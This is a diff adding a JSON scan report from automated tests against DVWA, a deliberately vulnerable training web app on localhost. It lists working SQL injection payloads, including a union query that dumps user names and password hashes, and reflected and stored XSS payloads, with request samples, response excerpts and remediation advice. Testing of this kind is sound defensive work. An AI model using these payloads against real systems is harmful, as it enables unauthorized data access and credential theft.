@@ -1,0 +1,272 @@
+{
+  "scan_date": "2025-06-18T04:39:43.716188Z",
+  "target": "DVWA (All modules)",
+  "vulnerabilities": [
+    {
+      "type": "SQL Injection",
+      "test_case_name": "SQLi Test #1: ' OR '1'='1",
+      "module": "native",
+      "payload": "' OR '1'='1",
+      "success": true,
+      "status": "Success",
+      "level": "N/A",
+      "severity": "Critical",
+      "remediation": "Use parameterized queries (prepared statements) for all database access. Always validate and sanitize user input.",
+      "evidence": [
+        "ID: ' OR '1'='1\nFirst name: admin\nSurname: admin",
+        "ID: ' OR '1'='1\nFirst name: Gordon\nSurname: Brown",
+        "ID: ' OR '1'='1\nFirst name: Hack\nSurname: Me",
+        "ID: ' OR '1'='1\nFirst name: Pablo\nSurname: Picasso",
+        "ID: ' OR '1'='1\nFirst name: Bob\nSurname: Smith"
+      ],
+      "request_sample": "GET http://localhost/vulnerabilities/sqli/?id=' OR '1'='1&Submit=Submit",
+      "status_code": 200,
+      "response_sample": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href=\"../../favicon.ico\" />\r"
+    },
+    {
+      "type": "SQL Injection",
+      "test_case_name": "SQLi Test #2: ' OR 1=1 #",
+      "module": "native",
+      "payload": "' OR 1=1 #",
+      "success": true,
+      "status": "Success",
+      "level": "N/A",
+      "severity": "Critical",
+      "remediation": "Use parameterized queries (prepared statements) for all database access. Always validate and sanitize user input.",
+      "evidence": [
+        "ID: ' OR 1=1 #\nFirst name: admin\nSurname: admin",
+        "ID: ' OR 1=1 #\nFirst name: Gordon\nSurname: Brown",
+        "ID: ' OR 1=1 #\nFirst name: Hack\nSurname: Me",
+        "ID: ' OR 1=1 #\nFirst name: Pablo\nSurname: Picasso",
+        "ID: ' OR 1=1 #\nFirst name: Bob\nSurname: Smith"
+      ],
+      "request_sample": "GET http://localhost/vulnerabilities/sqli/?id=' OR 1=1 #&Submit=Submit",
+      "status_code": 200,
+      "response_sample": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href=\"../../favicon.ico\" />\r"
+    },
+    {
+      "type": "SQL Injection",
+      "test_case_name": "SQLi Test #3: ' union select user, password from users#",
+      "module": "native",
+      "payload": "' union select user, password from users#",
+      "success": true,
+      "status": "Success",
+      "level": "N/A",
+      "severity": "Critical",
+      "remediation": "Use parameterized queries (prepared statements) for all database access. Always validate and sanitize user input.",
+      "evidence": [
+        "ID: ' union select user, password from users#\nFirst name: admin\nSurname: 5f4dcc3b5aa765d61d8327deb882cf99",
+        "ID: ' union select user, password from users#\nFirst name: gordonb\nSurname: e99a18c428cb38d5f260853678922e03",
+        "ID: ' union select user, password from users#\nFirst name: 1337\nSurname: 8d3533d75ae2c3966d7e0d4fcc69216b",
+        "ID: ' union select user, password from users#\nFirst name: pablo\nSurname: 0d107d09f5bbe40cade3de5c71e9e9b7",
+        "ID: ' union select user, password from users#\nFirst name: smithy\nSurname: 5f4dcc3b5aa765d61d8327deb882cf99"
+      ],
+      "request_sample": "GET http://localhost/vulnerabilities/sqli/?id=' union select user, password from users#&Submit=Submit",
+      "status_code": 200,
+      "response_sample": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href=\"../../favicon.ico\" />\r"
+    },
+    {
+      "type": "SQL Injection",
+      "test_case_name": "SQLi Test #4: addadasddad",
+      "module": "native",
+      "payload": "addadasddad",
+      "success": false,
+      "status": "Fail",
+      "level": "N/A",
+      "severity": "Low",
+      "remediation": "Use parameterized queries (prepared statements) for all database access. Always validate and sanitize user input.",
+      "evidence": [
+        "User ID:"
+      ],
+      "request_sample": "GET http://localhost/vulnerabilities/sqli/?id=addadasddad&Submit=Submit",
+      "status_code": 200,
+      "response_sample": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href=\"../../favicon.ico\" />\r"
+    },
+    {
+      "type": "XSS",
+      "test_case_name": "XSS Test #1: <script>alert('XSS')</script>",
+      "module": "native",
+      "payload": "<script>alert('XSS')</script>",
+      "success": true,
+      "status": "Success",
+      "level": "N/A",
+      "severity": "High",
+      "remediation": "Sanitize and encode user input/output. Use Content Security Policy (CSP). Apply input validation.",
+      "evidence": [
+        "Payload reflected: <script>alert('XSS')</script>",
+        "Detected <script> tag in response.",
+        "Detected alert() in response."
+      ],
+      "request_sample": "GET http://localhost/vulnerabilities/xss_r/ {'name': \"<script>alert('XSS')</script>\", 'Submit': 'Sign Guestbook'}",
+      "status_code": 200,
+      "response_sample": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: Reflected Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href="
+    },
+    {
+      "type": "XSS",
+      "test_case_name": "XSS Test #2: \"><img src=x onerror=alert(1)>",
+      "module": "native",
+      "payload": "\"><img src=x onerror=alert(1)>",
+      "success": true,
+      "status": "Success",
+      "level": "N/A",
+      "severity": "High",
+      "remediation": "Sanitize and encode user input/output. Use Content Security Policy (CSP). Apply input validation.",
+      "evidence": [
+        "Payload reflected: \"><img src=x onerror=alert(1)>",
+        "Detected <script> tag in response.",
+        "Detected alert() in response.",
+        "Detected image/event XSS payload."
+      ],
+      "request_sample": "GET http://localhost/vulnerabilities/xss_r/ {'name': '\"><img src=x onerror=alert(1)>', 'Submit': 'Sign Guestbook'}",
+      "status_code": 200,
+      "response_sample": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: Reflected Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href="
+    },
+    {
+      "type": "XSS",
+      "test_case_name": "XSS Test #3: <svg/onload=alert(1)>",
+      "module": "native",
+      "payload": "<svg/onload=alert(1)>",
+      "success": true,
+      "status": "Success",
+      "level": "N/A",
+      "severity": "High",
+      "remediation": "Sanitize and encode user input/output. Use Content Security Policy (CSP). Apply input validation.",
+      "evidence": [
+        "Payload reflected: <svg/onload=alert(1)>",
+        "Detected <script> tag in response.",
+        "Detected alert() in response."
+      ],
+      "request_sample": "GET http://localhost/vulnerabilities/xss_r/ {'name': '<svg/onload=alert(1)>', 'Submit': 'Sign Guestbook'}",
+      "status_code": 200,
+      "response_sample": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: Reflected Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href="
+    },
+    {
+      "type": "XSS",
+      "test_case_name": "XSS Test #4: <body onload=alert('xss')>",
+      "module": "native",
+      "payload": "<body onload=alert('xss')>",
+      "success": true,
+      "status": "Success",
+      "level": "N/A",
+      "severity": "High",
+      "remediation": "Sanitize and encode user input/output. Use Content Security Policy (CSP). Apply input validation.",
+      "evidence": [
+        "Payload reflected: <body onload=alert('xss')>",
+        "Detected <script> tag in response.",
+        "Detected alert() in response."
+      ],
+      "request_sample": "GET http://localhost/vulnerabilities/xss_r/ {'name': \"<body onload=alert('xss')>\", 'Submit': 'Sign Guestbook'}",
+      "status_code": 200,
+      "response_sample": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: Reflected Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href="
+    },
+    {
+      "type": "XSS",
+      "test_case_name": "XSS Test #5: \"><svg onload=alert('xss')>",
+      "module": "native",
+      "payload": "\"><svg onload=alert('xss')>",
+      "success": true,
+      "status": "Success",
+      "level": "N/A",
+      "severity": "High",
+      "remediation": "Sanitize and encode user input/output. Use Content Security Policy (CSP). Apply input validation.",
+      "evidence": [
+        "Payload reflected: \"><svg onload=alert('xss')>",
+        "Detected <script> tag in response.",
+        "Detected alert() in response."
+      ],
+      "request_sample": "GET http://localhost/vulnerabilities/xss_r/ {'name': '\"><svg onload=alert(\\'xss\\')>', 'Submit': 'Sign Guestbook'}",
+      "status_code": 200,
+      "response_sample": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: Reflected Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href="
+    },
+    {
+      "type": "XSS",
+      "test_case_name": "XSS Test #1: <script>alert('XSS')</script>",
+      "module": "native",
+      "payload": "<script>alert('XSS')</script>",
+      "success": true,
+      "status": "Success",
+      "level": "N/A",
+      "severity": "High",
+      "remediation": "Sanitize and encode user input/output. Use Content Security Policy (CSP). Apply input validation.",
+      "evidence": [
+        "Detected <script> tag in response."
+      ],
+      "request_sample": "POST http://localhost/vulnerabilities/xss_s/ {'message': \"<script>alert('XSS')</script>\", 'Submit': 'Sign Guestbook', 'name': 'autotest'}",
+      "status_code": 200,
+      "response_sample": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: Stored Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href=\".."
+    },
+    {
+      "type": "XSS",
+      "test_case_name": "XSS Test #2: \"><img src=x onerror=alert(1)>",
+      "module": "native",
+      "payload": "\"><img src=x onerror=alert(1)>",
+      "success": true,
+      "status": "Success",
+      "level": "N/A",
+      "severity": "High",
+      "remediation": "Sanitize and encode user input/output. Use Content Security Policy (CSP). Apply input validation.",
+      "evidence": [
+        "Detected <script> tag in response."
+      ],
+      "request_sample": "POST http://localhost/vulnerabilities/xss_s/ {'message': '\"><img src=x onerror=alert(1)>', 'Submit': 'Sign Guestbook', 'name': 'autotest'}",
+      "status_code": 200,
+      "response_sample": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: Stored Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href=\".."
+    },
+    {
+      "type": "XSS",
+      "test_case_name": "XSS Test #3: <svg/onload=alert(1)>",
+      "module": "native",
+      "payload": "<svg/onload=alert(1)>",
+      "success": true,
+      "status": "Success",
+      "level": "N/A",
+      "severity": "High",
+      "remediation": "Sanitize and encode user input/output. Use Content Security Policy (CSP). Apply input validation.",
+      "evidence": [
+        "Detected <script> tag in response."
+      ],
+      "request_sample": "POST http://localhost/vulnerabilities/xss_s/ {'message': '<svg/onload=alert(1)>', 'Submit': 'Sign Guestbook', 'name': 'autotest'}",
+      "status_code": 200,
+      "response_sample": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: Stored Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href=\".."
+    },
+    {
+      "type": "XSS",
+      "test_case_name": "XSS Test #4: <body onload=alert('xss')>",
+      "module": "native",
+      "payload": "<body onload=alert('xss')>",
+      "success": true,
+      "status": "Success",
+      "level": "N/A",
+      "severity": "High",
+      "remediation": "Sanitize and encode user input/output. Use Content Security Policy (CSP). Apply input validation.",
+      "evidence": [
+        "Detected <script> tag in response."
+      ],
+      "request_sample": "POST http://localhost/vulnerabilities/xss_s/ {'message': \"<body onload=alert('xss')>\", 'Submit': 'Sign Guestbook', 'name': 'autotest'}",
+      "status_code": 200,
+      "response_sample": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: Stored Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href=\".."
+    },
+    {
+      "type": "XSS",
+      "test_case_name": "XSS Test #5: \"><svg onload=alert('xss')>",
+      "module": "native",
+      "payload": "\"><svg onload=alert('xss')>",
+      "success": true,
+      "status": "Success",
+      "level": "N/A",
+      "severity": "High",
+      "remediation": "Sanitize and encode user input/output. Use Content Security Policy (CSP). Apply input validation.",
+      "evidence": [
+        "Detected <script> tag in response."
+      ],
+      "request_sample": "POST http://localhost/vulnerabilities/xss_s/ {'message': '\"><svg onload=alert(\\'xss\\')>', 'Submit': 'Sign Guestbook', 'name': 'autotest'}",
+      "status_code": 200,
+      "response_sample": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: Stored Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href=\".."
+    }
+  ],
+  "summary": {
+    "total_vulnerabilities": 14,
+    "successful_exploits": 13,
+    "risk_level": "Critical"
+  }
+}
